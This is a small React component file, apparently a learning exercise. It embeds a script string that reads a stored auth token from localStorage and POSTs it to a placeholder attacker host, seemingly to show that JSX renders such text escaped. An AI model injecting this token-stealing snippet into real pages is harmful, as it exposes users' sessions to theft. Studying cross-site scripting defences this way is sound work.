const maliciousScript = `
  <script>
    const token = window.localStorage.getItem('token');
    fetch('https://malicious-site.com/get-token', {
      method: 'POST',
      body: { token }
    })
    console.log('sent')
  </script>
`
export default function HelloWord() {
    
    const name = 'Emanuel';
    const title = <h1>Hello, {name} !!!</h1>
    const index = 0;

    if(name === 'Emanuel') {
    return <div>
        <h1 
            tabIndex={ index }
            style={{ background: 'red' }}
        > 
            { maliciousScript }
        </h1>
    </div>
    }
    
    return <div>
       { title }
    </div>
}